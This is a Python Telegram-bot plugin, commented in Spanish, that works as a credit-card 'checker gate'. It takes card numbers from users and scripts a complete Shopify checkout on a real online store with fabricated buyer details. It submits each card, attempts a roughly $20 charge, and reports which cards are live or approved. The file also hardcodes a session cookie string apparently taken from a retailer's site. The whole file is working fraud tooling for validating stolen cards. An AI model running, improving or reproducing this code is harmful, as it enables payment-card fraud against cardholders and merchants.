from plugins.defs1 import get_cc, luhn, bininfo
from pyrogram import Client, filters
import aiohttp
import requests
import plugins.sql.gates as gates
from pyrogram.types import Message
import time
from urllib.parse import urlparse
import random
from faker import Faker
from plugins.clases.usuarios import usuario
def buscar(res, primer, final):
    try:
        inicio = res.index( primer ) + len( primer )
        fin = res.index( final, inicio )
        return res[inicio:fin]
    except ValueError:
        return None

gate = "Shopify+Payeezy"
emojis1 = ["🙈", "💦", "🌏", "🐸", "🐧"]
emojis2 = ["😠", "☔", "☀", "🌈"]
rnd_emoji1 = random.choice(emojis1)
rnd_emoji2 = random.choice(emojis2)
r = requests.Session()
@Client.on_message(filters.command(["hq"], prefixes=["/", "."]))
async def premium(_, m: Message):
    Status = gates.buscarT("ezz")
    try:
        Estado = Status[2]
    except Exception: return await m.reply('<b>Error al encontrar el Gate</b>')
    if Estado == 'off': return await m.reply(f'𝑬𝒔𝒕𝒆 𝒄𝒐𝒎𝒂𝒏𝒅𝒐 𝒆𝒔𝒕𝒂 𝒅𝒆𝒔𝒂𝒄𝒕𝒊𝒗𝒂𝒅𝒐 𝒕𝒆𝒎𝒑𝒐𝒓𝒂𝒍𝒎𝒆𝒏𝒕𝒆\n𝑹𝒂𝒛𝒐́𝒏: <i>{Status[3]}</i>')
    start_time = time.time()
    user = m.from_user.username
    id = m.from_user.id
    user = usuario(nombre=user, id=id)
    rango = user.buscar()
    if not rango or rango == False: return await m.reply('<b>Usuario no registrado porfavor registrese</b>')
    if rango[2] == 'Free':
        return await m.reply('<b>Necesita ser Premium para utilizar este gate</b>')
    rangoC = rango[5]
    if rangoC == None:
        rangoC = rango[2]
    try:
        cc, mes, año, cvv = get_cc(m.text)
        veri = luhn(cc)
        if not cc or not mes or not año or not cvv: return await m.reply('<b>Formato invalido</b>')
        if veri == False: return await m.reply("<b>Algoritmo Luhn invalido ❌</b>")
    except Exception:
        return await m.reply("<b>Formato invalido\nCC|MES|AÑO|CVV</b>")
    respuesta = await m.reply(f"""<b>Checkeando CC | ⏳</b>""")
    fake = Faker()
    email = fake.ascii_free_email()
    product_link = "https://www.windsorstore.com/collections/accessories/products/fallin-for-you-rhinestone-linear-earrings-070011387006?variant=40598312615987"
    headers1 = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0'}
    r1 = r.get(product_link, headers=headers1)
    varient_id = buscar(r1.text, 'variantId":',',')
    if not r1: return await m.reply("Error 1")
    if not r1 or not varient_id: return await m.reply('<b>Error al checkear (auth_token)</b>')

    b_data = {
	"form_type": "product","utf8": "✓",
	"id": varient_id,"properties[_rc]": "9711",
	"properties[shipping_method]": "me",
	"properties[store_pickup]": "","quantity": "1"
}
    b_head = {
    'x-requested-with': 'XMLHttpRequest',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0'
    }
    webname = urlparse(product_link).netloc
    r2 = r.post(f'https://{webname}/cart/add', headers =b_head,data =b_data)
    if not r2: return await m.reply('<b>Error al checkear</b>')

    d_data = {
'updates[]': '1',
'checkout': 'Check Out'
}
    d_head = {
    'x-requested-with': 'XMLHttpRequest',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0'
    }

    r3 = r.post(f'https://{webname}/cart', headers=d_head, data=d_data)
    auth_token = buscar(r3.text, 'type="hidden" name="authenticity_token" value="','"')
    if not r3 or not auth_token: return await m.reply('<b>Error al checkear</b>')   
    checkout_url = r3.url
    taken1 = int(time.time()) - start_time
    await respuesta.edit(f"<b>Checkeando CC 20% | {rnd_emoji1}\nTiempo: {taken1:0.3}</b>")

    t1_data = {
	"_method": "patch",
	"authenticity_token": auth_token,
	"previous_step": "contact_information",
	"step": "shipping_method",
	"checkout[email_or_phone]": email,
	"checkout[buyer_accepts_marketing]": "0",
	"checkout[shipping_address][first_name]": [
		"",
		"jose"
	],
	"checkout[shipping_address][last_name]": [
		"",
		"quiroz"
	],
	"checkout[shipping_address][address1]": [
		"",
		"157+Allen+Street"
	],
	"checkout[shipping_address][address2]": [
		"",
		""
	],
	"checkout[shipping_address][city]": [
		"",
		"New+York"
	],
	"checkout[shipping_address][country]": [
		"",
		"United States"
	],
	"checkout[shipping_address][province]": [
		"",
		"NY"
	],
	"checkout[shipping_address][zip]": [
		"",
		"10009"
	],
	"checkout[remember_me]": [
		"false",
		"0"
	],
	"checkout[client_details][browser_width]": "1920",
	"checkout[client_details][browser_height]": "420",
	"checkout[client_details][javascript_enabled]": "1",
	"checkout[client_details][color_depth]": "24",
	"checkout[client_details][java_enabled]": "false",
	"checkout[client_details][browser_tz]": "180"
}
    r4 = r.post(checkout_url, data=t1_data, headers=headers1)
    if not r4 or not "step=shipping_method" in r4.url: return await m.reply('<b>Error al checkear</b>') 
    taken2 = int(time.time()) - start_time
    await respuesta.edit(f"<b>Checkeando CC 40% | {rnd_emoji2}\nTiempo: {taken2:0.3}</b>")
    t_data = {
	"_method": "patch",
	"authenticity_token": auth_token,
	"previous_step": "shipping_method",
	"step": "payment_method",
	"checkout[shipping_rate][id]": "shopify-Standard%20Shipping-4.99",
	"checkout[client_details][browser_width]": "1920",
	"checkout[client_details][browser_height]": "227",
	"checkout[client_details][javascript_enabled]": "1",
	"checkout[client_details][color_depth]": "24",
	"checkout[client_details][java_enabled]": "false",
	"checkout[client_details][browser_tz]": "180"
}
    t_headers = {
    'Host': 'www.harpercollins.com',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
    'Accept-Language': 'es-MX,es;q=0.8,en-US;q=0.5,en;q=0.3',
    'Accept-Encoding': 'gzip, deflate, br',
    'Referer': 'https://www.harpercollins.com/',
    'Content-Type': 'application/x-www-form-urlencoded',
    'Content-Length': '552',
    'Origin': 'https://www.harpercollins.com',
    'DNT': '1',
    'Cookie': 'checkout=eyJfcmFpbHMiOnsibWVzc2FnZSI6IkJBaEpJaVV3WTJJd1lUUTRZV1l6WXpneU16RTNabUU0WXpNMk1EZ3hOelF6WkRsaVpRWTZCa1ZVIiwiZXhwIjoiMjAyMy0wMS0xNlQwNzozMTowNi42MDJaIiwicHVyIjoiY29va2llLmNoZWNrb3V0In19--cdb492548bdf52c5b97ad4fc2d7e8e2790f87fb2; checkout_token=eyJfcmFpbHMiOnsibWVzc2FnZSI6IkJBaEpJaVUzTVRjNE9UWmtOemswTkRFeU5qZzNPV014T1RGak1XUmlZMlV6T0dVMlpRWTZCa1ZVIiwiZXhwIjoiMjAyMy0xMi0yNlQwNzozMTowNi42MDJaIiwicHVyIjoiY29va2llLmNoZWNrb3V0X3Rva2VuIn19--4ddf55ac7ee9f9983caab94766457393be00fb79; tracked_start_checkout=717896d7944126879c191c1dbce38e6e; previous_checkout_token=eyJfcmFpbHMiOnsibWVzc2FnZSI6IkJBaEpJaVV4T0RoaVlUSTVOVE0xTmpobU0yVXlObVE0WWpRMU5qTmhaR1E0TjJSaU1RWTZCa1ZVIiwiZXhwIjoiMjAyMy0xMi0yNlQwNzowMTo0NS4xNTFaIiwicHVyIjoiY29va2llLnByZXZpb3VzX2NoZWNrb3V0X3Rva2VuIn19--0cfcdc3664fc01faedd6ec6b809cf7eb77045a0f; keep_alive=a309e4cd-35dc-4e5b-8462-21f29f9db6fa; secure_customer_sig=; localization=US; _orig_referrer=; _landing_page=%2Fproducts%2Fbound-to-me-jocelynn-drake%3Fvariant%3D32127336677410; _y=8208d2f2-e8e3-4b6f-9b0d-0703c028e638; _s=8c389c0a-5b58-4534-9ded-e430e420c55b; _shopify_y=8208d2f2-e8e3-4b6f-9b0d-0703c028e638; _shopify_s=8c389c0a-5b58-4534-9ded-e430e420c55b; _gcl_au=1.1.1866431806.1672037782; _ga_BWH2Y83W11=GS1.1.1672037781.1.1.1672039966.0.0.0; _ga=GA1.1.344309368.1672037782; _ALGOLIA=anonymous-7a7d22c9-e0fb-4e87-a07c-323a571b4993; exitintel_ver=2; exitintel_cfg=%7B%22se%22%3A%22cookie-domain%22%7D; exitintel_vid=7ca43a3e-c06a-46e3-b803-e1ee1f56ac56; exitintel_sid=4eed8b10-9d0f-476f-a8fc-c166412df6c6; exitintel_vc=1; exitintel_ref=https%3A%2F%2Fwww.harpercollins.com%2Fproducts%2Fbound-to-me-jocelynn-drake%3Fvariant%3D32127336677410; exitintel_pvc=16; exitintel_lp=https%3A%2F%2Fwww.harpercollins.com%2Fproducts%2Fbound-to-me-jocelynn-drake%3Fvariant%3D32127336677410; exitintel_prf=%7B%22gatheredData%22%3A%7B%7D%2C%22achivedGoals%22%3A%7B%7D%7D; exitintel_cs=%5B%7B%22id%22%3A%22636189ad9215c8ee13000001%22%2C%22expires%22%3A1673335012%2C%22timestamp%22%3A1672039012%2C%22params%22%3A%7B%22adId%22%3A%22638a20ae1dba1bfc0e000002%22%7D%2C%22count%22%3A1%7D%5D; exitintel_cc=%5B%5D; exitintel_cd=%5B%5D; exitintel_cv=%5B%22636189ad9215c8ee13000001%22%5D; _pin_unauth=dWlkPVpERmtaV0kwTmpBdE9XSTFaaTAwT0dJM0xXSmxNek10TkdVMFpqazVaalF4WlRnMQ; _shg_session_id=7cb8ae5c-6ac9-4e15-9a8a-24f9001e98b1; _shg_user_id=1381a7b2-c166-4379-8330-3c8fb62d71dc; exitintel_cfid=default; _secure_session_id=61fc3a9af95542c35b694915d37b4ce8; TawkConnectionTime=0; twk_idm_key=4r58Q180gp80WGEOpq-i_; twk_uuid_61942d806885f60a50bc1f83=%7B%22uuid%22%3A%221.92MgYCFBJkR4mZ6lCYN4kZlp9lvv6jKWUZLx9BTN8ErWIYe0VcqJyT5I3QqZyNej6fVSyy62uOIDnbEt6Zuxtez8gL7d5uqhk6pkkK8F1atdbzZhYO9Pv6Tl4t5t%22%2C%22version%22%3A3%2C%22domain%22%3A%22harpercollins.com%22%2C%22ts%22%3A1672039956654%7D; sailthru_pageviews=6; wishlist_id=28528214050nistibjxw2c; bookmarkeditems={"items":[]}; wishlist_customer_id=0; _shopify_sa_t=2022-12-26T07%3A32%3A45.937Z; _shopify_sa_p=; sailthru_content=59b511036e28e5a148a9eebf9f73bb9031974daa5d8f92ba86767d09486bf636f5cb86a354a48cd6bb0d49e3ab202410; sailthru_visitor=863c2cb4-cf66-4515-b775-cfc99e9a76f7; cart=763ffc40f52b56e9fe73b23cf0f4b348; cart_ts=1672039833; cart_sig=ac297ba0b4ff91cbbfa5cbd92415b968; cart_ver=gcp-us-central1%3A2; cart_currency=USD; _checkout_queue_token=Ap-oyu87PjZ_GvtW5cwJ2LyrIwtUscs_CKBMk7RbTBhMXiEodaEWhLNPblnmDvBhQuaeTLXVLarIgrXLF8hs7LaIoxYm2m6CVjOhcggMZ9QX33vv6aa7xEW_MtkGuF85TdHUlZur2_Qbg_3hcjTjlYMAofKMtLWOfhTLFPmYp3gBmbkL4STd5SWt5RM%3D; _checkout_queue_checkout_token=eyJfcmFpbHMiOnsibWVzc2FnZSI6IkJBaEpJaVUzTVRjNE9UWmtOemswTkRFeU5qZzNPV014T1RGak1XUmlZMlV6T0dVMlpRWTZCa1ZVIiwiZXhwIjoiMjAyMi0xMi0yNlQwODozMTowNi4zMzBaIiwicHVyIjoiY29va2llLl9jaGVja291dF9xdWV1ZV9jaGVja291dF90b2tlbiJ9fQ%3D%3D--32861cf4a486d4c76b9bfd7ca5f7a2200f88b067; unique_interaction_id=ed2b91a0-6467-449e-2ec1-c0d65c1a17cb',
    'Connection': 'keep-alive',
    'Upgrade-Insecure-Requests': '1',
    'Sec-Fetch-Dest': 'document',
    'Sec-Fetch-Mode': 'navigate',
    'Sec-Fetch-Site': 'same-origin',
    'Sec-Fetch-User': '?1',
    'TE': 'trailers'
}
    t = r.post(checkout_url, data=t_data, headers=headers1)
    if not t: return await m.reply('<b>Error al checkear1</b>') 
    payment_gateway = buscar(t.text,'data-subfields-for-gateway="','"')
    if not payment_gateway:
        await respuesta.edit(t.url)
        t2 = r.get(checkout_url+"?previous_step=shipping_method&step=payment_method")
        payment_gateway = buscar(t2.text,'data-subfields-for-gateway="','"')
        if not payment_gateway:
            print(t2.text)
            return await m.reply('<b>Error al checkear</b>') 
    nombre = str(fake.name())
    json_four = json_four = {"credit_card": {"month": mes,"name": nombre,"number": cc,"verification_value": cvv,"year": año},"payment_session_scope": {webname}}

    four = r.post('https://deposit.us.shopifycs.com/sessions', json = json_four)
    
    if "id" not in four.json(): return await m.reply('Error al checkear')
    try:
        id = four.json()["id"]
    except TypeError as e:
        print("Error:", e) 
    taken3 = int(time.time()) - start_time
    await respuesta.edit(f"<b>Checkeando CC 85% | {rnd_emoji2}\nTiempo: {taken3:0.3}</b>")

    dic = {
	"_method": "patch","authenticity_token": auth_token,
	"previous_step": "payment_method","step": "","s": id,
	"checkout[payment_gateway]": payment_gateway,
	"checkout[credit_card][vault]": "false",
	"checkout[different_billing_address]": "false",
	"checkout[total_price]": "2093","complete": "1",
	"checkout[client_details][browser_width]": "1920",
	"checkout[client_details][browser_height]": "518",
	"checkout[client_details][javascript_enabled]": "1",
	"checkout[client_details][color_depth]": "24",
	"checkout[client_details][java_enabled]": "false",
	"checkout[client_details][browser_tz]": "180"
}
    f = r.post(checkout_url, data = dic)
    response_r1 = buscar(f.text, 'class="notice__text">', "<")
    if not f or 'processing' not in f.url and response_r1 == None: return await m.reply('Error al checkear')
    time.sleep(4)
    g = r.get(checkout_url + '/processing?from_processing_page=1')
    time.sleep(6)
    charge_Link=None
    if "Thank you" in g.text: charge_Link = "Charged"
    if not charge_Link:
        if not g or 'from_processing_page=1&validate=true' not in g.url: print(g.text); return await m.reply('Error al checkear')
    complete = f"{cc}|{mes}|{año}|{cvv}"
    getBin =  bininfo(cc)
    if "Error" in getBin: return await respuesta.edit('<b>Error al obtener la informacion del bin</b>')
    binP, vendor, tipo, level, bank, codeCountry, country, emojiCountry = getBin
    response_error = buscar(g.text, 'class="notice__text">', "<")
    r_logo, r_message, r_res = "❌", 'Declined', response_error
    if charge_Link != None: r_logo, r_message, r_res = "✅", "Approved", "CHARGED $20.93" 
    if response_error == "CVV2 Mismatch: 15004-This transaction cannot be processed. Please enter a valid Credit Card Verification Number.": r_logo, r_message, r_res = "✅", "CCN Live", response_error
    if response_error == "Addres not Verified - Approved": r_logo, r_message, r_res = "✅", "Approved", response_error
    if response_error == "Address not Verified - Insufficient Funds": r_logo, r_message, r_res = "✅", "Approved", response_error
    if response_r1 != None: response_error = response_r1
    taken4 = int(time.time()) - start_time
    nombre = m.from_user.first_name
    if nombre == None: nombre = ""
    apellido = m.from_user.last_name
    if apellido == None: apellido = ""
    await respuesta.edit(f"""𝐂𝐚𝐫𝐝: <code><i>{complete}</i></code>\n𝐒𝐭𝐚𝐭𝐮𝐬: <i>{r_message} {r_logo}</i>\n𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: <i>{r_res}</i>\n𝐆𝐚𝐭𝐞: <i>{gate}</i>\n<b>------> 𝐃𝐞𝐭𝐚𝐢𝐥𝐬 <------</b>\n𝐁𝐢𝐧: <code><i>{binP}</i></code>\n𝐁𝐢𝐧 𝐢𝐧𝐟𝐨: <code><i>{vendor} - {tipo} - {level}</i></code>\n𝐁𝐚𝐧𝐤: <code><i>{bank}</i></code>\n𝐂𝐨𝐮𝐧𝐭𝐫𝐲: {emojiCountry} <code><i>{country} - {codeCountry}</i></code>\n<b>------> 𝐈𝐧𝐟𝐨 <------</b>\n𝐓𝐢𝐦𝐞: {taken4:0.3} 𝐒𝐞𝐠𝐬\n𝐂𝐡𝐞𝐜𝐤𝐞𝐝 𝐛𝐲:  <a href="tg://user?id={m.from_user.id}">{nombre} {apellido}</a> [{rangoC}]\n𝐎𝐰𝐧𝐞𝐫: <code><i>𝐃𝐫𝐚𝐱𝐱𝐝𝟑𝟎</i></code>""")